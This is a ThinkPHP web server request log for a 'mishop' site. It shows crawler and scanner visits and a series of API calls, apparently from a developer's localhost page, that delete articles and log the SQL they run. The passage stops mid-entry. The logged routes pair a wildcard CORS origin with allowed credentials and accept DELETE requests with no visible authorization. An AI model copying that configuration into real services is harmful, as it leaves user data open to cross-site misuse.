---------------------------------------------------------------

[2020-09-24T00:00:01+08:00] 203.208.60.40 GET www.techbimu.com/.well-known/assetlinks.json
[运行时间：0.003298s] [吞吐率：303.21req/s] [内存消耗：533.96kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T01:53:23+08:00] 83.97.20.30 GET 0/
[运行时间：0.004561s] [吞吐率：219.25req/s] [内存消耗：871.43kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T04:12:29+08:00] 128.14.133.58 GET 101.132.45.200/solr/
[运行时间：0.003413s] [吞吐率：293.00req/s] [内存消耗：533.95kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T04:28:06+08:00] 183.136.225.56 GET 101.132.45.200/
[运行时间：0.005390s] [吞吐率：185.53req/s] [内存消耗：872.79kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T05:44:01+08:00] 3.81.245.94 GET mishop.holyzq.com/
[运行时间：0.004460s] [吞吐率：224.21req/s] [内存消耗：872.98kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'accept' => '*/*',
  'user-agent' => '"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T08:15:59+08:00] 205.169.39.109 GET mishop.holyzq.com/
[运行时间：0.004284s] [吞吐率：233.43req/s] [内存消耗：877.88kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'en-US',
  'accept-encoding' => 'gzip, deflate, br',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'same-origin',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T08:16:04+08:00] 205.169.39.109 GET mishop.holyzq.com/
[运行时间：0.004394s] [吞吐率：227.58req/s] [内存消耗：876.16kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'none',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/78.0.3904.70 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T09:19:09+08:00] 203.208.60.52 GET www.techbimu.com/.well-known/assetlinks.json
[运行时间：0.003342s] [吞吐率：299.21req/s] [内存消耗：533.97kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T10:52:23+08:00] 184.105.247.196 GET 101.132.45.200/
[运行时间：0.004366s] [吞吐率：229.03req/s] [内存消耗：871.00kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T11:56:06+08:00] 192.241.234.238 GET 101.132.45.200/
[运行时间：0.004617s] [吞吐率：216.59req/s] [内存消耗：872.57kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T12:12:59+08:00] 94.102.51.119 GET 101.132.45.200:443/
[运行时间：0.004526s] [吞吐率：220.94req/s] [内存消耗：875.39kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-GB,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'host' => '101.132.45.200:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T13:55:14+08:00] 209.17.96.90 GET www.techbimu.com/
[运行时间：0.004224s] [吞吐率：236.74req/s] [内存消耗：871.73kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)',
  'host' => 'www.techbimu.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T15:11:56+08:00] 183.136.225.56 GET 101.132.45.200/
[运行时间：0.004438s] [吞吐率：225.33req/s] [内存消耗：872.98kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'user-agent' => 'Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T16:36:23+08:00] 47.103.21.0 GET mishop.holyzq.com/
[运行时间：0.004401s] [吞吐率：227.22req/s] [内存消耗：872.80kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'mishop.holyzq.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T16:53:36+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article
[运行时间：0.005007s] [吞吐率：199.72req/s] [内存消耗：914.20kb] [文件加载：132]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000445s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000579s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000250s ]
---------------------------------------------------------------

[2020-09-24T16:53:39+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/25
[运行时间：0.002701s] [吞吐率：370.23req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:39+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/25
[运行时间：0.007022s] [吞吐率：142.41req/s] [内存消耗：807.02kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '25',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '25',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000437s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000551s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 25 [ RunTime:0.002686s ]
---------------------------------------------------------------

[2020-09-24T16:53:43+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/24
[运行时间：0.002399s] [吞吐率：416.85req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:43+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/24
[运行时间：0.006030s] [吞吐率：165.84req/s] [内存消耗：807.02kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '24',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '24',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000412s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000596s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 24 [ RunTime:0.001999s ]
---------------------------------------------------------------

[2020-09-24T16:53:46+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/23
[运行时间：0.002721s] [吞吐率：367.53req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:46+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/23
[运行时间：0.005871s] [吞吐率：170.33req/s] [内存消耗：807.02kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '23',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '23',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000451s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000662s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 23 [ RunTime:0.001894s ]
---------------------------------------------------------------

[2020-09-24T16:53:49+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/19
[运行时间：0.002399s] [吞吐率：416.85req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:49+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/19
[运行时间：0.006505s] [吞吐率：153.73req/s] [内存消耗：807.03kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '19',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '19',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000456s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000767s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 19 [ RunTime:0.002083s ]
---------------------------------------------------------------

[2020-09-24T16:53:52+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/6
[运行时间：0.002264s] [吞吐率：441.69req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:52+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/6
[运行时间：0.005884s] [吞吐率：169.95req/s] [内存消耗：807.02kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '6',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '6',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000419s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000565s ]
[ sql ] [ SQL ] DELETE FROM `article` WHERE  `id` = 6 [ RunTime:0.001969s ]
---------------------------------------------------------------

[2020-09-24T16:53:56+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/delete/18
[运行时间：0.002310s] [吞吐率：432.89req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'DELETE',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T16:53:56+08:00] 59.174.168.242 DELETE mishop.holyzq.com/api/article/delete/18
[运行时间：0.005757s] [吞吐率：173.70req/s] [内存消耗：807.02kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/delete/<id>',
  'route' => 'api/Article/delete',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '18',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=5eo83ksouonsp39kpi5o8851iu',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
